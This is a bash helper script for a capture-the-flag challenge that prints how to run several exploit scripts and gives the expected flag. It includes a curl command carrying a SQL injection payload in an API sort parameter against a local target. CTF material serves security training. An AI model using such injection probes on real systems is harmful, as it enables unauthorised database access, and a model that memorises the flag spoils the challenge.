#!/bin/bash
# Order 66 CTF Challenge - Quick Usage Examples

echo "🏴 Order 66 CTF Challenge - Exploit Examples"
echo "============================================="
echo ""

echo "📋 Available Exploit Scripts:"
echo "1. exploit_poc.py     - Advanced exploit with colored output"
echo "2. simple_exploit.py  - Basic exploit (minimal dependencies)"  
echo "3. solution.py        - Original solution script"
echo ""

echo "🚀 Quick Start Examples:"
echo ""

echo "# 1. Run the advanced exploit (recommended)"
echo "pip install -r requirements.txt"
echo "python3 exploit_poc.py"
echo ""

echo "# 2. Run with custom target"
echo "python3 exploit_poc.py http://challenge.ctf.com"
echo ""

echo "# 3. Run in quiet mode"
echo "python3 exploit_poc.py --quiet"
echo ""

echo "# 4. Run simple exploit (no extra dependencies)"
echo "python3 simple_exploit.py"
echo ""

echo "# 5. Manual testing with curl"
echo "curl \"http://localhost:8000/api/todos?sort=(CASE%20WHEN%201=1%20THEN%20created_at%20ELSE%20priority%20END)\""
echo ""

echo "🎯 Expected Flag: SKYDAYS{SKYORDER_66_HAD_TO_EXECUTED}"
echo ""

echo "📚 For detailed documentation, see POC_README.md"
echo "May the Force be with you! 🌟"